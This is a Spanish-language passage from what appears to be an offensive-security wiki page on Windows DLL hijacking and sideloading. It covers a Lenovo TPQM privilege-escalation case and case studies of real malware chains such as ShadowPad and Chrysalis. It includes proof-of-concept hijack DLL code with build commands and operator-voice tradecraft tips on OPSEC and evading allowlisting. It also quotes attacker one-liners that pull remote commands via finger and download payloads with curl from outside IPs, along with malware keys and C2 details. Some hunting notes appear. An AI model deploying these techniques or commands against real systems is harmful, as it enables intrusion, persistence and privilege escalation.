- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM bajo el contexto del user logueado.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Intenta cargar `hostfxr.dll` primero desde su working directory y registra "NAME NOT FOUND" si falta, indicando precedencia de búsqueda en el directorio local.

### Exploit Implementation

Un attacker puede colocar un stub malicioso de `hostfxr.dll` en el mismo directorio, explotando la DLL faltante para lograr code execution bajo el contexto del user:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM bajo el contexto del usuario actual.
3. Si hay un administrador con sesión iniciada cuando se ejecuta la tarea, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadena técnicas estándar de UAC bypass para elevar de integridad media a privilegios SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Los threat actors suelen combinar droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso confiable y firmado.

Resumen de la cadena
- El usuario descarga el MSI. Un CustomAction se ejecuta silenciosamente durante la instalación GUI (por ejemplo, LaunchApplication o una acción VBScript), reconstruyendo la siguiente etapa a partir de recursos incrustados.
- El dropper escribe un EXE legítimo y firmado y una DLL maliciosa en el mismo directorio (ejemplo de par: wsc_proxy.exe firmado por Avast + wsc.dll controlada por el atacante).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLL de Windows carga wsc.dll primero desde el directorio de trabajo, ejecutando el código del atacante bajo un proceso padre firmado (ATT&CK T1574.001).

Análisis del MSI (qué buscar)
- Tabla CustomAction:
- Busca entradas que ejecuten ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecutando un archivo incrustado en segundo plano.
- En Orca (Microsoft Orca.exe), inspecciona las tablas CustomAction, InstallExecuteSequence y Binary.
- Payloads incrustados/divididos en el CAB del MSI:
- Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- O usa lessmsi: lessmsi x package.msi C:\out
- Busca múltiples fragmentos pequeños que sean concatenados y descifrados por un CustomAction VBScript. Flujo común:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
- wsc_proxy.exe: host firmado legítimo (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
- wsc.dll: DLL del atacante. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, construye una proxy DLL y reenvía los exports necesarios a la biblioteca genuina mientras ejecutas el payload en DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportación, usa un proxying framework (p. ej., DLLirant/Spartacus) para generar un forwarding DLL que también ejecute tu payload.

- Esta técnica depende de la resolución del nombre del DLL por parte del host binary. Si el host usa absolute paths o safe loading flags (p. ej., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS y forwarded exports pueden influir en la precedencia y deben considerarse durante la selección del host binary y el export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point describió cómo Ink Dragon despliega ShadowPad usando una **tri-file triad** para integrarse con software legítimo mientras mantiene el core payload cifrado en disco:

1. **Signed host EXE** – se abusan vendors como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes renombran el ejecutable para que parezca un Windows binary (por ejemplo `conhost.exe`), pero la Authenticode signature sigue siendo válida.
2. **Malicious loader DLL** – se deja junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). El DLL suele ser un MFC binary ofuscado con el framework ScatterBrain; su única tarea es localizar el encrypted blob, decrypt it, y mapear ShadowPad de forma reflective.
3. **Encrypted payload blob** – a menudo se almacena como `<name>.tmp` en el mismo directorio. Después de memory-mapping el decrypted payload, el loader borra el archivo TMP para destruir evidencia forense.

Tradecraft notes:

* Renombrar el signed EXE (manteniendo el `OriginalFileName` original en el PE header) le permite hacerse pasar por un Windows binary y conservar la vendor signature, así que replica la costumbre de Ink Dragon de dejar binaries con aspecto de `conhost.exe` que en realidad son utilidades de AMD/NVIDIA.
* Como el executable sigue siendo trusted, la mayoría de los controles de allowlisting solo necesitan que tu malicious DLL esté junto a él. Enfócate en personalizar el loader DLL; normalmente el signed parent puede ejecutarse sin cambios.
* El decryptor de ShadowPad espera que el TMP blob esté junto al loader y que sea writable para poder poner a cero el archivo después de mapearlo. Mantén el directorio writable hasta que el payload cargue; una vez en memoria, el archivo TMP puede borrarse con seguridad para OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Los operadores combinan DLL sideloading con LOLBAS para que el único artefacto personalizado en disco sea el malicious DLL junto al trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell lanza `cmd.exe /c`, obtiene comandos desde un Finger server y los envía a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtiene texto por TCP/79; `| cmd` ejecuta la respuesta del servidor, permitiendo a los operadores rotar el second stage desde el servidor.

- **Built-in download/extract:** Descarga un archive con una extensión benigna, lo desempaqueta y prepara el sideload target junto al DLL en una carpeta aleatoria de `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta el progreso y sigue redirects; `tar -xf` usa el tar integrado de Windows.

- **WMI/CIM launch:** Inicia el EXE mediante WMI para que la telemetría muestre un proceso creado por CIM mientras carga el DLL ubicado al lado:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona con binaries que prefieren local DLLs (p. ej., `intelbq.exe`, `nearby_share.exe`); el payload (p. ej., Remcos) se ejecuta bajo el nombre trusted.

- **Hunting:** Genera alerta sobre `forfiles` cuando `/p`, `/m` y `/c` aparecen juntos; es poco común fuera de scripts de administración.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una trusted update chain para entregar un NSIS-packed dropper que preparó un DLL sideload más payloads totalmente en memoria.

Tradecraft flow
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca como **HIDDEN**, deja un Bitdefender Submission Wizard `BluetoothService.exe` renombrado, un malicious `log.dll`, y un encrypted blob `BluetoothService`, y luego lanza el EXE.
- El host EXE importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob con mmap; `LogWrite` lo decrypts con un stream custom basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, material de la key derivado de un hash previo), sobrescribe el buffer con shellcode en plaintext, libera los temporales y salta a él.
- Para evitar una IAT, el loader resuelve APIs hasheando export names usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, y luego aplicando un Murmur-style avalanche (**0x85EBCA6B**) y comparando contra salted target hashes.

Main shellcode (Chrysalis)
- Decrypts un PE-like main module repitiendo add/XOR/sub con la key `gQ2JR&9;` durante cinco pases, y luego carga dinámicamente `Kernel32.dll` → `GetProcAddress` para terminar la resolución de imports.
- Reconstruye strings de nombres de DLL en runtime mediante transforms por carácter de bit-rotate/XOR, y luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre el **PEB → InMemoryOrderModuleList**, analiza cada export table en bloques de 4 bytes con Murmur-style mixing, y solo recurre a `GetProcAddress` si el hash no se encuentra.

Embedded configuration & C2
- La config vive dentro del archivo `BluetoothService` dejado en **offset 0x30808** (size **0x980**) y se decrypts con key RC4 `qwhvb^435h&*7`, revelando la URL del C2 y el User-Agent.
- Las beacons construyen un host profile delimitado por puntos, anteponen la etiqueta `4Q`, y luego RC4-encrypt con la key `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Las respuestas se RC4-decrypt y se envían según un tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- El modo de ejecución está controlado por args de CLI: sin args = instala persistence (service/Run key) apuntando a `-i`; `-i` relanza a sí mismo con `-k`; `-k` omite la instalación y ejecuta el payload.

Alternate loader observed
- La misma intrusión dejó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` al lado. El C source proporcionado por el atacante incrustaba shellcode, lo compilaba y lo ejecutaba en memoria sin tocar el disco con un PE. Replica con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compile-and-run basada en TCC importó `Wininet.dll` en tiempo de ejecución y obtuvo un shellcode de segunda etapa desde una URL hardcoded, dando un loader flexible que se hace pasar por una compilación.

## Signed-host sideloading con export proxying + host thread parking

Algunas cadenas de DLL sideloading añaden **stability engineering** para que el host legítimo siga vivo el tiempo suficiente para cargar etapas posteriores limpiamente en lugar de crashear después de que se cargue la DLL maliciosa.

Patrón observado
- Coloca un EXE confiable junto a una DLL maliciosa usando el nombre de dependencia esperado, como `version.dll`.
- La DLL maliciosa **proxy every expected export** de vuelta a la DLL real del sistema (por ejemplo `%SystemRoot%\\System32\\version.dll`) para que la resolución de imports siga funcionando y el proceso host continúe operativo.
- Después de la carga, la DLL maliciosa **parchea el entry point del host** para que el hilo principal caiga en un bucle infinito de `Sleep` en lugar de salir o ejecutar rutas de código que terminarían el proceso.
- Un nuevo hilo realiza el trabajo malicioso real: descifrar el nombre o la ruta de la DLL de la siguiente etapa (RC4/XOR son comunes) y luego lanzarla con `LoadLibrary`.

Por qué importa
- El proxying normal de DLL preserva la compatibilidad de API, pero no garantiza que el host siga vivo el tiempo suficiente para etapas posteriores.
- Poner en `Sleep(INFINITE)` el hilo principal es una forma simple de mantener residente el proceso firmado mientras el loader realiza descifrado, staging o bootstrap de red en un worker thread.
- Buscar solo un `DllMain` sospechoso puede pasar por alto este patrón si el comportamiento interesante ocurre después de que se parchea el entry point del host y comienza un hilo secundario.

Flujo mínimo
1. Copia el EXE host firmado y determina la DLL que resuelve desde el directorio local.
2. Construye una DLL proxy exportando las mismas funciones y reenviándolas a la DLL legítima.
3. En `DllMain(DLL_PROCESS_ATTACH)`, crea un worker thread.
4. Desde ese hilo, parchea el entry point del host o la rutina de inicio del hilo principal para que haga loop en `Sleep`.
5. Descifra el nombre/config de la DLL de la siguiente etapa y llama a `LoadLibrary` o carga manualmente el payload.

Pivotes defensivos
- Procesos firmados cargando `version.dll` o librerías comúnmente similares desde su propio directorio de aplicación en lugar de `System32`.
- Parches de memoria en el entry point del proceso poco después de la carga de la imagen, especialmente saltos/llamadas redirigidas a `Sleep`/`SleepEx`.
- Hilos creados por una DLL proxy que inmediatamente llaman a `LoadLibrary` sobre una segunda DLL con un nombre descifrado.
- DLL proxy de exports completos colocadas junto a ejecutables de vendor dentro de directorios de staging escribibles como `ProgramData`, `%TEMP%` o rutas de archivos descomprimidos.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
